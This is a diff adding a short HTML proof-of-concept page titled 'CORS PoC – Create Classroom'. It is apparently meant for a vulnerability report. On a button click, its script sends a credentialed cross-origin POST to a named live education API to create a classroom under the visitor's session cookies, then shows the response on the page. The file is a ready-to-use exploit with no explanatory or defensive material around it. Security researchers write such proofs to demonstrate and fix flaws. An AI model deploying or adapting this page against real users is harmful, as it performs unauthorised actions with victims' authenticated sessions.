@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC – Create Classroom</title>
+</head>
+<body>
+  <h2>CORS PoC</h2>
+  <button onclick="exploit()">Send CORS Request</button>
+
+  <pre id="result"></pre>
+
+  <script>
+    function exploit() {
+      fetch("https://schools.duolingo.com/api/2/classrooms", {
+        method: "POST",
+        credentials: "include", // IMPORTANT for cookie-based auth
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          classrooms: [{
+            from_language: "en",
+            learning_language: "en",
+            name: "cors-poc"
+          }]
+        })
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.getElementById("result").innerText =
+          "Response received:\n" + data;
+      })
+      .catch(err => {
+        document.getElementById("result").innerText =
+          "Request blocked or failed:\n" + err;
+      });
+    }
+  </script>
+</body>
+</html>
